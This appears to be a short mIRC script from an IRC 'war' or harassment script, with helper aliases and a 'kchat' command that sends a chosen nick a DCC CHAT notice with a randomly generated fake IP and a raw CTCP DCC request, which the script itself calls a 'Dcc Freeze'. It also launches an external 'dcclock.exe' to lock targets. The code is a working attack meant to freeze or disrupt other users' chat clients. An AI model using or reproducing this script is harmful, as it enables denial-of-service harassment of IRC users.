;=======================
;                Setup
;=======================

alias becho echo -a 16- | echo -a *** 12¢$Mak$¢10 $1- 
alias nc { 
  if ($server == $null) && (%connect == $null) { set %connect SET | .timer55 1 4 unset %connect | mecho 2ERROR: Your not connected to the server | halt }
  if ($server == $null) && (%connect == SET) { .timer55 off | .timer55 1 4 unset %connect | set %connect SET2 | mecho 2ERROR: Try connecting to the freakin server | halt }
  if ($server == $null) && (%connect == SET2) { .timer55 off | unset %connect | mecho 2ERROR: Hey Numbnuts, your still not connected | halt }
}
alias mecho echo -a 16- | echo 2 -a *** 4¢$Mak$¢2 $1- 
alias dcclock {
  if (%dcc.lock == $null) || ($exists(%dcc.lock) == $false) { set %dcc.lock $findfile($mircdir,dcclock.exe,1) }
  if (%dcc.lock == $null) { mecho Error: Dcclock.exe couldn't be found in the directory $mircdir | unset %dcc.lock | halt }
  run %dcc.lock | mecho Loading Dcc Lock... | mecho Use /kchat [nick] or popups to initiate a Dcc Lock.
}

alias kchatip /set %kchat.ip ( $+ $r(1,2) $+ $r(1,9) $+ $r(1,9) $+ . $+ $r(1,9) $+ $r(1,9) $+ . $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ . $+ $r(1,9) $+ $r(1,9) $+ )
alias kchat {
  nc | if (%kchatport != $null) && (%kchat != $null) { goto kill } | if ($1 == $null) { set %kchat $$?="¢$Enter Nick$¢:" }
  else { set %kchat $1 } | if ($2 == $null) { set %kchatport 450 $+ $r(1,4) | goto kill }
  else { set %kchatport $2 | goto kill }
  :kill | kchatip | .notice %kchat DCC Chat %kchat.ip | raw privmsg %kchat : $+ $chr(001) $+ DCC CHAT chat $longip($ip) %kchatport | mecho Sending Dcc Freeze to %kchat 
  unset %kchat %kchatport %kchat.ip  
}
